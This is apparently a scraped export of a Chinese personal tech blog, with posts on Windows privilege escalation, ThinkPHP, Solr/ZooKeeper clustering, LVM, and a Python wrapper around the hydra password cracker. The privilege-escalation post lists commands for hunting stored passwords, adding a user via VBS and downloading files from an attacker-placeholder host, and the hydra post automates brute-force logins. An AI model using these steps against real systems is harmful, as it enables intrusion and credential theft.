BASIC WINDOWS PRIVILEGE ESCALATIONhttps://thel3l.me/blog/winprivesc/index.html由于原文有些命令在中文Windows下无效，所以另外整理了下 系统信息获取系统名称和版本123C:\\Windows\\system32&gt;systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;OS 名称: Microsoft Windows 10 专业版OS 版本: 10.0.14393 暂缺 Build 14393 检查系统版本位数 如果是64位系统则返回”AMD64”否则返回”X86”12C:\\&gt;echo %PROCESSOR_ARCHITECTURE%AMD64 查看系统所有环境变量12345678C:\\&gt;SETALLUSERSPROFILE=C:\\ProgramDataAPPDATA=C:\\Users\\V\\AppData\\RoamingCommonProgramFiles=C:\\Program Files\\Common FilesCommonProgramFiles(x86)=C:\\Program Files (x86)\\Common FilesCommonProgramW6432=C:\\Program Files\\Common FilesCOMPUTERNAME=V_VComSpec=C:\\Windows\\system32\\cmd.exe 查看计算机所有用户 NET USER 查看指定用户详细详细 NET USER USERNAME1234567891011121314151617181920212223242526C:\\&gt;net user Administrator用户名 Administrator全名注释 管理计算机(域)的内置帐户用户的注释国家/地区代码 000 (系统默认值)帐户启用 No帐户到期 从不上次设置密码 2016/9/18 10:40:15密码到期 从不密码可更改 2016/9/18 10:40:15需要密码 Yes用户可以更改密码 Yes允许的工作站 All登录脚本用户配置文件主目录上次登录 从不可允许的登录小时数 All本地组成员 *Administrators *Ssh Users全局组成员 *None命令成功完成。 网络信息查看基本网络情况 IPCONFIG /ALL 查看路由表 route print 查看ARP缓存 arp -A 防火墙相关 查看端口占用情况netstat -ano 防火墙配置netsh firewall show config123456789101112131415161718192021C:\\&gt;netsh firewall show config域 配置文件配置:-------------------------------------------------------------------操作模式 = 启用例外模式 = 启用多播/广播响应模式 = 启用通知模式 = 启用域 配置文件的允许的程序配置:模式 流量方向 名称/程序-------------------------------------------------------------------域 配置文件的端口配置:端口 协议 流量方向 名称-------------------------------------------------------------------域 配置文件的 ICMP 配置:模式 类型 描述-------------------------------------------------------------------启用 2 允许出站数据包太大 防火墙状态netsh firewall show state123456789101112131415161718192021222324C:\\&gt;netsh firewall show state防火墙状态:-------------------------------------------------------------------配置文件 = 标准操作模式 = 禁用例外模式 = 启用多播/广播响应模式 = 启用通知模式 = 启用组策略版本 = Windows 防火墙远程管理模式 = 禁用所有网络接口上的端口当前均为打开状态:端口 协议 版本 程序-------------------------------------------------------------------当前没有在所有网络接口上打开的端口。重要信息: 已成功执行命令。但不赞成使用 &quot;netsh firewall&quot;；而应该使用 &quot;netsh advfirewall firewall&quot;。有关使用 &quot;netsh advfirewall firewall&quot; 命令而非 &quot;netsh firewall&quot; 的详细信息，请参阅http://go.microsoft.com/fwlink/?linkid=121488上的 KB 文章 947709。 应用程序和服务查看正在运行的程序和服务 schtasks /QUERY /fo LIST /v以list的形式输入详细信息12345678910111213141516171819202122232425262728主机名: VVV任务名: \\Microsoft\\XblGameSave\\XblGameSaveTaskLogon下次运行时间: N/A模式: 就绪登录状态: 交互方式/后台方式上次运行时间: 2016/9/17 21:05:59上次结果: 0创建者: Microsoft要运行的任务: %windir%\\System32\\XblGameSaveTask.exe logon起始于: N/A注释: XblGameSave Logon Task计划任务状态: 已启用空闲时间: 仅在空闲 分钟后启动, 如果没空闲，重试 分钟 如果空闲结束，停止任务电源管理: 不用电池启动作为用户运行: SYSTEM删除没有计划的任务: 已禁用如果运行了 X 小时 X 分钟，停止任务: 02:00:00计划: 计划数据在此格式中不可用。计划类型: 登陆时开始时间: N/A开始日期: N/A结束日期: N/A天: N/A月: N/A重复: 每: N/A重复: 截止: 时间: N/A重复: 截止: 持续时间: N/A重复: 如果还在运行，停止: N/A 查看服务的进程ID tasklist /SVC 查看已安装的驱动程序列表 DRIVERQUERY123456789101112C:\\&gt;DRIVERQUERY模块名 显示名称 驱动程序类型 链接日期============ ====================== ============= ======================1394ohci 1394 OHCI Compliant Ho Kernel 2016/7/16 10:21:363ware 3ware Kernel 2015/5/19 6:28:03ACPI Microsoft ACPI Driver Kernel 2016/7/16 10:10:47AcpiDev ACPI 设备驱动程序 Kernel 2016/7/16 10:29:10acpiex Microsoft ACPIEx Drive Kernel 2016/7/16 10:28:23acpipagr ACPI 处理器聚合器驱动 Kernel 2016/7/16 10:29:00AcpiPmi ACPI 电源表驱动程序 Kernel 2016/7/16 10:19:44acpitime ACPI 唤醒警报驱动程序 Kernel 2016/7/16 10:29:20 也可以通过WMIC获取更多信息 查看已安装程序相关信息(包括程序名、供应商、版本、识别号等)Caption、Identifying Number 、Name、Vendor、Version比如我安装的XShell相关信息如下12345Xshell 5&#123;F3FDFD5A-A201-407B-887F-399484764ECA&#125;Xshell 5NetSarang Computer, Inc.5.0.0983 按照类似的方法还可以获取 服务、进程、和启动项相关信息123456# Lists serviceswmic service list brief# Lists processeswmic process list brief# Lists startup itemswmic startup list brief 查看是否有可作为非特权用户执行的msi文件如果没有则会返回”错误: 系统找不到指定的注册表项或值。” 12reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevatedreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 查看setuid或setgid是否被修改过只存在于Windows Servers中1reg query HKEY_Local_Machine\\System\\CurrentControlSet\\Services\\NfsSvr\\Parameters\\SafeSetUidGidBits 查看系统更新记录 wmic qfe get Caption,Description,HotFixID,InstalledOn12345C:\\Windows\\system32&gt;wmic qfe get Caption,Description,HotFixID,InstalledOnCaption Description HotFixID InstalledOnhttp://support.microsoft.com/?kbid=3176936 Update KB3176936 8/26/2016http://support.microsoft.com/?kbid=3188128 Security Update KB3188128 9/16/2016http://support.microsoft.com/?kbid=3189866 Security Update KB3189866 9/16/2016 123#还可以搜索可提升权限的特定漏洞，比如wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:&quot;KB3189031&quot;#如果没有返回信息则说明没安装该补丁 ##敏感数据和目录 搜索未加密的密码或其它敏感信息123456789#进入系统盘根目录cd/#返回该分区所有名为password.txt的文件的路径dir /b/s password.txt#返回该分区所有以config开头的文件的路径dir /b/s config.*#在特定格式的文件中搜索特定信息，比如findstr /si password *.xml *.ini *.txtfindstr /si login *.xml *.ini *.txt 在一些大型企业中，系统可能是通过脚本自动安装的，一些文件中可能存在包含base64编码的日志，这些文件一般位于如下路径1234C:\\sysprep.infC:\\sysprep\\sysprep.xmlC:\\Windows\\Panther\\Unattend\\Unattended.xmlC:\\Windows\\Panther\\Unattended.xml ##文件系统 了解有什么样的访问权限、可访问目录等 ###使用其他语言绕过一些限制以Python为例(如果目标机器安装了Python)1234567891011C:\\&gt;pythonPython 2.7.12 (v2.7.12:d33e0cf91556, Jun 27 2016, 15:24:40) [MSC v.1500 64 bit (AMD64)] on win32Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.&gt;&gt;&gt; import os; os.system(&quot;cmd /c net user&quot;)\\\\VV 的用户帐户-------------------------------------------------------------------------------Administrator DefaultAccount defaultuser0Guest Junhu命令成功完成。 使用VBS脚本 12345D:\\&gt;copy con commandExec1.vbsCall WScript.CreateObject(&quot;Wscript.Shell&quot;).Run(&quot;cmd /K net user demo /add&quot;, 8, True)^Z已复制 1 个文件。D:\\&gt;commandExec1.vbs ###或者通过打开一个ftp来执行相关命令12345#使用copy con创建批处理文件,输入&quot;ftp&quot;按CTRL+z后回车，即可创建成功copy con run_ftp.bat#运行文件run_ftp.batftp&gt;!dir ###检查可写文件1dir /a-r-d /s /b ##使用脚本 ###使用VB脚本下载相应东西到目标主机 来自 Igor1234567891011121314151617181920212223242526272829&apos; downloadfile.vbs&apos; Set your settingsstrFileURL = &quot;http://&#123;YOUR_IP&#125;/&#123;FILE_NAME.EXT&#125;&quot;strHDLocation = &quot;c:\\\\&#123;FILE_NAME.EXT&#125;&quot;&apos; Fetch the fileSet objXMLHTTP = CreateObject(&quot;MSXML2.XMLHTTP&quot;)objXMLHTTP.open &quot;GET&quot;, strFileURL, falseobjXMLHTTP.send()If objXMLHTTP.Status = 200 ThenSet objADOStream = CreateObject(&quot;ADODB.Stream&quot;)objADOStream.OpenobjADOStream.Type = 1 &apos;adTypeBinaryobjADOStream.Write objXMLHTTP.ResponseBodyobjADOStream.Position = 0 &apos;Set the stream position to the startSet objFSO = Createobject(&quot;Scripting.FileSystemObject&quot;)If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocationSet objFSO = NothingobjADOStream.SaveToFile strHDLocationobjADOStream.CloseSet objADOStream = NothingEnd ifSet objXMLHTTP = Nothing 运行下载脚本1cscript.exe downloadfile.vbs ####bitsadmin 或者如果你知道目标主机为Windows 7 以上的操作系统，则可使用bitsadmin实现下载目标url:http://static.myhack58.com/img/logo.jpg保存地址:D:\\logo.jpg1bitsadmin /rawreturn /transfer getfile http://static.myhack58.com/img/logo.jpg D:\\logo.jpg Exploits and shellcode http://www.exploit-db.comhttp://1337day.comhttp://0day.todayhttp://www.securityfocus.comhttp://seclists.org/fulldisclosure/http://www.exploitsearch.nethttp://www.securiteam.comhttp://metasploit.com/modules/http://securityreason.comhttps://cxsecurity.com/exploit/http://securitytracker.com/ 其他优秀资源 rmusser01’s GitHub document to Post Exploitation on WindowsTim Arneaud on Windows Privilege EscalationAn article on WMICLuke Jennings on Group Policy Hijacking AttacksToying with the Windows APIenaqx - Excellent curated collection of content PowerShellMafia’s PowerSploitThe SysInternals suiteWindows Credential EditorMimikatz - Credential ExtractionGDSSecurity’s Windows Exploit SuggesterSpiderLab’s Responder - A LLMNR, NBT-NS and MDNS poisonerPowerShellEmpire’s Empire - Pure PowerShell post-exploitation agentrabbitstack’s fibratus - A tool for exploration and tracing of the Windows kernel","tags":[{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/tags/Linux/"},{"name":"提权","slug":"提权","permalink":"http://yoursite.com/tags/提权/"}]},{"title":"ThinkPHP折腾笔记","date":"2016-11-21T11:41:09.000Z","path":"others/ThinkPHP折腾笔记/","text":"开始 将ThinkPHP下载后，解压至网站根目录为了快速安装PHP环境，我使用的是phpStudy在ThinkPHP的同级目录创建index.php，文件内容为123456&lt;?phpdefine('APP_DEBUG',true);define('APP_NAME', 'App');define('APP_PATH','./App/');require('./ThinkPHP/ThinkPHP.php'); 该文件会创建名为App的文件夹，目录结构大概这样子1234567891011121314151617181920.├── Common├── Conf│ ├── config.php├── Lang├── Lib│ ├── Action│ │ └── IndexAction.class.php│ ├── Behavior│ ├── Model│ └── Widget├── Runtime│ ├── Cache│ │ ├── 9885ecc411f90bec36756701bd64bb4a.php│ │ └── f331a3f0d874c4248458495ef2c2c2d1.php│ ├── Data│ ├── Logs│ │ └── 16_11_27.log│ └── Temp└── Tpl 如果要添加函数，可在Common文件夹下创建common.php文件进行实现，然后在lib/Action/IndexActionclass.php中直接通过函数名进行调用。比如 12345 cat Common/common.php&lt;?phpfunction show()&#123; echo &apos;hello world1&apos;;&#125; 1234567891011121314151617181920cat Lib/Action/IndexAction.class.php&lt;?php// 本类由系统自动生成，仅供测试用途class IndexAction extends Action &#123; public function index()&#123; //echo C(&apos;name&apos;),&apos;&lt;br/&gt;&apos;; //echo C(&apos;sex&apos;); // echo C(&apos;URL_MODEL&apos;),&apos;&lt;br/&gt;&apos;; //echo U(&apos;index/user&apos;,array(&apos;id&apos;=&gt;1),&apos;html&apos;,false,&apos;localhost&apos;); show(); // $arr=array(1,2,3,4,5); // dump($arr); // $this-&gt;display(); &#125; public function user()&#123; echo &apos;id is:&apos;.$_GET[&apos;id&apos;].&apos;&lt;br/&gt;&apos;; // echo &apos;这里是INDEX模块的user方法&apos;; &#125;&#125; 如果要添加模板的话 123在Tpl目录下创建函数同名的文件夹如Index在该文件夹中创建index.html，然后在IndexAction.class.php通过$this-&gt;display();进行调用如果Tpl/Index目录下有多个html，则通过$this-&gt;display(&apos;文件名&apos;);进行调用 123456789101112&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt;Hello World.&lt;/body&gt;&lt;/html&gt; 模板输入1234&#123;$now|date=&apos;Y-m-d H:i:s&apos;,###&#125;&lt;p/&gt;&#123;$Think.now&#125;&lt;p/&gt;&#123;$Think.version&#125;&lt;p/&gt; for循环123&lt;for start=&apos;1&apos; end=&apos;10&apos; name=&apos;k&apos;&gt; &#123;$k&#125;&lt;br/&gt;&lt;/for&gt; if12345&lt;if condition=&apos;$num gt 10&apos;&gt; num &gt; 10&lt;elseif condition=&quot;$num lt 10&quot;/&gt;num &lt; 10&lt;else/&gt;num===10&lt;/if&gt;","tags":[]},{"title":"solr分布式环境配置","date":"2016-10-20T11:44:24.000Z","path":"devops/solr分布式环境配置/","text":"搭建zookeeper集群 使用的是三个节点，分别为192.168.64.132 node2192.168.64.130 node1192.168.64.131 node3 在节点中分别配置主机名IP隐射关系1echo &apos;192.168.64.132 node2\\n192.168.64.130 node1\\n192.168.64.131 node3&apos; &gt;&gt; /etc/hosts &amp;&amp; source /etc/hosts 创建相关文件夹 在各节点根目录中创建 soft文件夹并将下载好的zookeeper解压至该文件夹1tar -zxvf zookeeper-3.5.2-alpha.tar.gz -C /soft/ 新建zookeeper数据存储文件夹和日志存储文件夹12mkdir /soft/zookeeper-datamkdir /soft/zookeeper-data/logs 新建节点标示 以node1为例其他节点以此类推1echo 1 &gt; /soft/zookeeper-data/myid 编辑配置文件123cd /soft/zookeeper-3.5.2-alpha/mv conf/zoo_sample.cfg conf/zoo.cfgvim /conf/zoo.cfg 12345dataDir=/soft/zookeeper-datadataLogDir=/soft/zookeeper-data/logsserver.1=node1:2888:3888server.2=node2:2888:3888server.3=node3:2888:3888 配置完成后把配置发送到其他两台机子启动zookeeper12345➜ zookeeper-3.5.2-alpha bin/zkServer.sh start conf/zoo.cfg/usr/bin/javaZooKeeper JMX enabled by defaultUsing config: conf/zoo.cfgStarting zookeeper ... STARTED 验证是否启动成功 123456➜ zookeeper-3.5.2-alpha bin/zkServer.sh status conf/zoo.cfg/usr/bin/javaZooKeeper JMX enabled by defaultUsing config: conf/zoo.cfgClient port found: 2181. Client address: localhost.Mode: leader 安装Java环境1apt-get install openjdk-8-jre-headless 运行solr 解压 并运行下载好的solr1234tar -zxvf solr-6.2.1.tgzroot@tp-ubuntu:/opt/solr-6.2.1# ./bin/solr startWaiting up to 30 seconds to see Solr running on port 8983 [-] Started Solr server on port 8983 (pid=20810). Happy searching! 效果图 创建/solr目录12345# 进入zookeeper后台命令，默认连接本地localhost:2181./zookeeper/bin/zkCli.sh# 创建目录create /solr &quot;solr&quot; 初始化solr配置文件 上传solr自带配置文件到zookeeper的/solr/configs目录下1./bin/solr zk -z localhost:2181/solr -upconfig -n solr -d example/example-DIH/solr/solr 参数说明1234-upconfig to move a configset from the local machine to Zookeeper.-n configName Name of the configset in Zookeeper that will be the destinatino of &apos;upconfig&apos; and the source for &apos;downconfig&apos;.-d confdir The local directory the configuration will be uploaded from-z zkHost Zookeeper connection string. 补充说明12使用自定义ZooKeeper connection string启动Solr。该选项只能在-c选项，即SolrCloud模式下使用。如果该选项未提供，Solr将启动内置ZooKeeper实例如果指定ZooKeeper连接字符串，例如&quot;-z 192.168.64.133:2181&quot;，Solr将连接到ZooKeeper并加入集群。如果以cloud模式启动，但没有指定-z选项，则Solr启动内置ZooKeeper服务器，坚挺在Solr端口+1000，例如Solr在端口8983，则内置ZooKeeper监听在端口9983 查看zookeeper目录：以前的schema.xml换成了managed-schema文件，具体配置文档：https://cwiki.apache.org/confluence/display/solr/Documents%2C+Fields%2C+and+Schema+Design 使用solr自带的jetty启动服务12cd /soft/solrbin/solr start -c -m 1g -z node1:2181/solr,node2:2181/solr,node3:2181/solr -p 8983 1234-c：cloud模式启动-m：最大内存使用-z：zookeeper集群地址-p：启动服务端口 分别在其他节点上也以此方式启动solr创建collections集群 1.通过浏览器访问http://192.168.64.130:8983/solr创建集群 或者通过restful api创建collections集群 1curl &apos;http://localhost:8983/solr/admin/collections?action=CREATE&amp;name=solr&amp;numShards=3&amp;replicationFactor=2&amp;maxShardsPerNode=2&apos; 123456name：待创建Collection的名称configset：collection在zookeeper中的配置目录numShards：分片的数量replicationFactor：复制副本的数量maxShardsPerNode：默认值为1，注意三个数值：numShards、replicationFactor、liveSolrNode，一个正常的solrCloud集群不容许同一个liveSolrNode上部署同一个shard的多个replic，因此当maxShardsPerNode=1时，numShards*replicationFactor&gt;liveSolrNode时，报错。因此正确时因满足以下条件：numShards*replicationFactor&lt;liveSolrNode*maxShardsPerNode 最终效果图 导入配置 最后一条命令需要指定到具体配置目录执行命令结束后，需要到也没reload下core12bash /dat0/solr/server/scripts/cloud-scripts/zkcli.sh -cmd linkconfig -zkhost localhost:9983 -collection cninfo -confname cninfoconfbash /dat0/solr/server/scripts/cloud-scripts/zkcli.sh -cmd upconfig -zkhost localhost:9983 -confname cninfoconf -confdir /dat0/solr/server/cloud/conf/","tags":[{"name":"Solr","slug":"Solr","permalink":"http://yoursite.com/tags/Solr/"}]},{"title":"LVM相关介绍","date":"2016-09-20T14:54:45.000Z","path":"devops/LVM相关介绍/","text":"LVM概念 Logical Volume Manager 逻辑卷管理 12通过将底层物理硬盘抽象封装起来，以逻辑卷的形式表现给上层系统，逻辑卷的大小可以动态调整，而且不会丢失现有数据。新加入的硬盘也不会改变现有上层的逻辑卷。作为一种多台磁盘管理机制，逻辑卷技术大大提高了磁盘管理的灵活性。 LVM的4个基本概念1234567① PE (Physical Extend) 物理拓展② PV (Physical Volume) 物理卷③ VG (Volume Group) 卷组④ LV (Logical Volume) 逻辑卷 PE逻辑卷空间管理的最基本单位。1个PE默认是4M大小VG的作用是用来装PV的–空间池 创建LVM123456789101112131415161718➜ ~ fdisk -lDisk /dev/sda: 300 GiB, 322122547200 bytes, 629145600 sectorsUnits: sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisklabel type: dosDisk identifier: 0xc1fc20aeDevice Boot Start End Sectors Size Id Type/dev/sda1 * 2048 612370431 612368384 292G 83 Linux/dev/sda2 612372478 629143551 16771074 8G 5 Extended/dev/sda5 612372480 629143551 16771072 8G 82 Linux swap / SolarisDisk /dev/sdb: 50 GiB, 53687091200 bytes, 104857600 sectorsUnits: sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytes 将物理磁盘设备初始化为物理卷12➜ ~ pvcreate /dev/sdb Physical volume &quot;/dev/sdb&quot; successfully created 查看物理卷信息123➜ ~ pvs PV VG Fmt Attr PSize PFree /dev/sdb lvm2 --- 50.00g 50.00g 创建卷组，并将PV加入卷组中123&gt;名字为lvmtest， 可任意➜ ~ vgcreate lvmtest /dev/sdb Volume group &quot;lvmtest&quot; successfully created 12345678910111213141516171819202122232425➜ ~ vgs VG #PV #LV #SN Attr VSize VFree lvmtest 1 0 0 wz--n- 50.00g 50.00g&gt;查看卷组信息➜ ~ vgdisplay --- Volume group --- VG Name lvmtest System ID Format lvm2 Metadata Areas 1 Metadata Sequence No 1 VG Access read/write VG Status resizable MAX LV 0 Cur LV 0 Open LV 0 Max PV 0 Cur PV 1 Act PV 1 VG Size 50.00 GiB PE Size 4.00 MiB Total PE 12799 Alloc PE / Size 0 / 0 Free PE / Size 12799 / 50.00 GiB VG UUID cxMG1m-pMAE-Suk5-bM69-1sB3-W7YB-WXmmGh 基于卷组创建逻辑卷 这里我从lvmtest拿了20G空间来创建了一个名为lv1的逻辑卷 12➜ ~ lvcreate -n lv1 -L 20G lvmtest Logical volume \"lv1\" created 查看逻辑卷信息1234567891011121314151617181920➜ ~ lvs LV VG Attr LSize Pool Origin Data% Meta% Move Log Cpy%Sync Convert lv1 lvmtest -wi-a----- 20.00g ➜ ~ lvdisplay --- Logical volume --- LV Path /dev/lvmtest/lv1 LV Name lv1 VG Name lvmtest LV UUID Q4UIbv-yWhL-Bl5A-ywTN-1HJo-TE5r-TKBPfQ LV Write Access read/write LV Creation host, time kali, 2016-08-03 08:44:31 +0800 LV Status available # open 0 LV Size 20.00 GiB Current LE 5120 Segments 1 Allocation inherit Read ahead sectors auto - currently set to 256 Block device 254:0 为创建好的逻辑卷创建文件系统 123456789101112➜ ~ mkfs.ext4 /dev/lvmtest/lv1mke2fs 1.42.12 (29-Aug-2014)Creating filesystem with 5242880 4k blocks and 1310720 inodesFilesystem UUID: 5130e6e1-8293-4fcb-b580-5091f3840f99Superblock backups stored on blocks: 32768, 98304, 163840, 229376, 294912, 819200, 884736, 1605632, 2654208, 4096000Allocating group tables: done Writing inode tables: done Creating journal (32768 blocks): doneWriting superblocks and filesystem accounting information: done 将格式化好的逻辑卷挂载使用 1➜ ~ mount /dev/lvmtest/lv1 /mnt/ 查看12➜ /mnt mount | tail -n 1/dev/mapper/lvmtest-lv1 on /mnt type ext4 (rw,relatime,data=ordered) 删除LVM 先把相应的东西umount掉1➜ ~ umount /mnt 12➜ ~ mount | tail -n 1/dev/sr0 on /media/cdrom0 type iso9660 (ro,nosuid,nodev,noexec,relatime,user) 删除LV 123➜ ~ lvremove /dev/lvmtest/lv1Do you really want to remove active logical volume lv1? [y/n]: y Logical volume &quot;lv1&quot; successfully removed 删除VG 12➜ ~ vgremove lvmtest Volume group &quot;lvmtest&quot; successfully removed 删除物理卷 12➜ ~ pvremove /dev/sdb Labels on physical volume &quot;/dev/sdb&quot; successfully wiped 扩充逻辑卷容量 逻辑卷的拉伸操作可以在线执行，不需要卸载逻辑卷 保证VG中有足够的空闲空间 123➜ ~ vgs VG #PV #LV #SN Attr VSize VFree vg 1 1 0 wz--n- 50.00g 30.00g 扩充逻辑卷 123➜ ~ lvextend -L +1G /dev/vg/lv Size of logical volume vg/lv changed from 20.00 GiB (5120 extents) to 21.00 GiB (5376 extents). Logical volume lv successfully resized 查看扩充后LV大小 1234567891011121314151617➜ ~ lvdisplay --- Logical volume --- LV Path /dev/vg/lv LV Name lv VG Name vg LV UUID 5q9mCJ-7Y3f-dEo7-xlDz-lJAW-Oczm-RuCeIE LV Write Access read/write LV Creation host, time kali, 2016-08-03 09:51:18 +0800 LV Status available # open 0 LV Size 21.00 GiB Current LE 5376 Segments 1 Allocation inherit Read ahead sectors auto - currently set to 256 Block device 254:0 更新文件系统 12345➜ ~ resize2fs /dev/vg/lvresize2fs 1.42.12 (29-Aug-2014)Filesystem at /dev/vg/lv is mounted on /mnt; on-line resizing requiredold_desc_blocks = 2, new_desc_blocks = 2The filesystem on /dev/vg/lv is now 5505024 (4k) blocks long. 查看更新后文件系统 123456789101112➜ ~ df -hFilesystem Size Used Avail Use% Mounted onudev 10M 0 10M 0% /devtmpfs 792M 9.1M 783M 2% /run/dev/sda1 288G 16G 257G 6% /tmpfs 2.0G 208K 2.0G 1% /dev/shmtmpfs 5.0M 0 5.0M 0% /run/locktmpfs 2.0G 0 2.0G 0% /sys/fs/cgrouptmpfs 396M 8.0K 396M 1% /run/user/132tmpfs 396M 12K 396M 1% /run/user/0/dev/sr0 3.1G 3.1G 0 100% /media/cdrom0/dev/mapper/vg-lv 21G 44M 20G 1% /mnt 扩充卷组容量 将要添加到VG的硬盘格式化为PV 12➜ ~ pvcreate /dev/sdc Physical volume &quot;/dev/sdc&quot; successfully created 将新的PV添加到指定卷组中 12➜ ~ vgextend vg /dev/sdc Volume group &quot;vg&quot; successfully extended 查看扩充后VG大小 123➜ ~ vgs VG #PV #LV #SN Attr VSize VFree vg 2 1 0 wz--n- 69.99g 48.99g 缩小逻辑卷容量 逻辑卷的缩小操作必须离线执行，要卸载逻辑卷 卸载一键挂载的逻辑卷 1➜ ~ umount /dev/mapper/vg-lv 缩小文件系统 缩小为10G 1234567891011121314151617181920➜ ~ resize2fs /dev/vg/lv 10Gresize2fs 1.42.12 (29-Aug-2014)Please run &apos;e2fsck -f /dev/vg/lv&apos; first.➜ ~ resize2fs /dev/mapper/vg-lv 10Gresize2fs 1.42.12 (29-Aug-2014)Please run &apos;e2fsck -f /dev/mapper/vg-lv&apos; first.➜ ~ e2fsck -f /dev/mapper/vg-lve2fsck 1.42.12 (29-Aug-2014)Pass 1: Checking inodes, blocks, and sizesPass 2: Checking directory structurePass 3: Checking directory connectivityPass 4: Checking reference countsPass 5: Checking group summary information/dev/mapper/vg-lv: 11/1376256 files (0.0% non-contiguous), 130401/5505024 blocks➜ ~ resize2fs /dev/mapper/vg-lv 10Gresize2fs 1.42.12 (29-Aug-2014)Resizing the filesystem on /dev/mapper/vg-lv to 2621440 (4k) blocks.The filesystem on /dev/mapper/vg-lv is now 2621440 (4k) blocks long. 缩小LV 缩小的容量为之前的容量减去文件系统容量21-10=11 123456➜ ~ lvreduce -L -11G /dev/vg/lv WARNING: Reducing active logical volume to 10.00 GiB THIS MAY DESTROY YOUR DATA (filesystem etc.)Do you really want to reduce lv? [y/n]: y Size of logical volume vg/lv changed from 21.00 GiB (5376 extents) to 10.00 GiB (2560 extents). Logical volume lv successfully resized 查看缩小后的LV 1234567891011121314151617➜ ~ lvdisplay --- Logical volume --- LV Path /dev/vg/lv LV Name lv VG Name vg LV UUID 5q9mCJ-7Y3f-dEo7-xlDz-lJAW-Oczm-RuCeIE LV Write Access read/write LV Creation host, time kali, 2016-08-03 09:51:18 +0800 LV Status available # open 0 LV Size 10.00 GiB Current LE 2560 Segments 1 Allocation inherit Read ahead sectors auto - currently set to 256 Block device 254:0 挂载 123➜ ~ mount /dev/vg/lv /mnt➜ ~ mount | tail -n 1/dev/mapper/vg-lv on /mnt type ext4 (rw,relatime,data=ordered) 缩小卷组 将一个PV从制定卷组中移除 12➜ ~ vgreduce vg /dev/sdc Removed &quot;/dev/sdc&quot; from volume group &quot;vg&quot; 查看缩小后的卷组大小 123456789101112131415161718192021~ vgdisplay--- Volume group ---VG Name vgSystem ID Format lvm2Metadata Areas 1Metadata Sequence No 8VG Access read/writeVG Status resizableMAX LV 0Cur LV 1Open LV 1Max PV 0Cur PV 1Act PV 1VG Size 50.00 GiBPE Size 4.00 MiBTotal PE 12799Alloc PE / Size 2560 / 10.00 GiBFree PE / Size 10239 / 40.00 GiBVG UUID E32ZJW-3NqL-jpr2-1KYN-QWDh-dZhJ-1ZxZ2i 移除物理卷 12345678910➜ ~ pvs PV VG Fmt Attr PSize PFree /dev/sdb vg lvm2 a-- 50.00g 40.00g /dev/sdc lvm2 --- 20.00g 20.00g➜ ~ pvremove /dev/sdc Labels on physical volume &quot;/dev/sdc&quot; successfully wiped➜ ~ pvs PV VG Fmt Attr PSize PFree /dev/sdb vg lvm2 a-- 50.00g 40.00g➜ ~","tags":[{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/tags/Linux/"},{"name":"LVM","slug":"LVM","permalink":"http://yoursite.com/tags/LVM/"}]},{"title":"hydra 折腾笔记","date":"2016-09-20T10:18:54.000Z","path":"sec/hydra-折腾笔记/","text":"命令1output =subprocess.Popen(\"hydra -l ftp -P wooyun.txt 192.168.1.20 ftp\", shell=True,stdout=subprocess.PIPE).communicate()[0] 123In [62]: &apos;successfully&apos; in outputOut[62]: True 相关文档 http://www.cnblogs.com/mchina/archive/2013/01/01/2840815.html 备选方案 全能暴力破解测试工具——Patator v0.5https://github.com/lanjelot/patator python 捕获 shell 脚本的输出结果12345678910111213141516import subprocessoutput =Popen([\"mycmd\",\"myarg\"], stdout=PIPE).communicate()[0]import subprocessp = subprocess.Popen(['ls','-a'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)out, err = p.communicate()print out# work on Unix/Linux onlyimport commandsprint commands.getstatusoutput('wc -l file')[1] [Demo] Py-hydra123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293# -*- coding: utf-8 -*-'''通过Python操作Hydra进行相关服务弱口令扫描相关结果以json的形式返回'''__author__ = \"SanNa\"import subprocessimport sysimport jsonimport signal# 设置超时时间TIME_OUT = 20def start_hydra(ip, service, username, password): '''调用hydra进行破解 :param ip: 目标ip :param service: 服务类型 :param username: 用户字典 :param password: 密码字典 :return str ''' kwargs = &#123; 'ip': ip, 'service': service, 'username': username, 'password': password, &#125; command_str = \"hydra -L &#123;username&#125; -P &#123;password&#125; &#123;ip&#125; &#123;service&#125;\" result = subprocess.Popen(command_str.format(**kwargs), shell=True, stdout=subprocess.PIPE).communicate()[0] return resultdef return_json(result): '''从扫描结果中提出相关信息 :param result: 扫描结果 :return json ''' ok_flag = 'target successfully completed' fail_flag = '0 valid passwords found' data = &#123; 'login': None, 'password': None, &#125; if ok_flag in result: data['status'] = 'success' item = result.split('\\n')[5] data['login'] = item.split(' ')[6] data['password'] = item.split(' ')[10] elif fail_flag in result: data['status'] = 'fail' else: data['status'] = 'unknown error.' return json.dumps([data])def handler(signum, frame): raise AssertionErrorif __name__ == '__main__': ip = sys.argv[1] service = sys.argv[2] username = 'username.txt' password = 'password.txt' # try: # username = sys.argv[3] # except: # username = 'ftp' # try: # password = sys.argv[4] # except: # password = 'ftp' print '[*] Place wait...' try: # 超时设置 signal.signal(signal.SIGALRM, handler) signal.alarm(TIME_OUT) result = start_hydra(ip, service, username, password) print result data = return_json(result) except AssertionError: print \"TIMEOUT!\" 执行结果123456789101112➜ hydar python test.py 192.168.1.55 ftp[*] Place wait...Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.Hydra 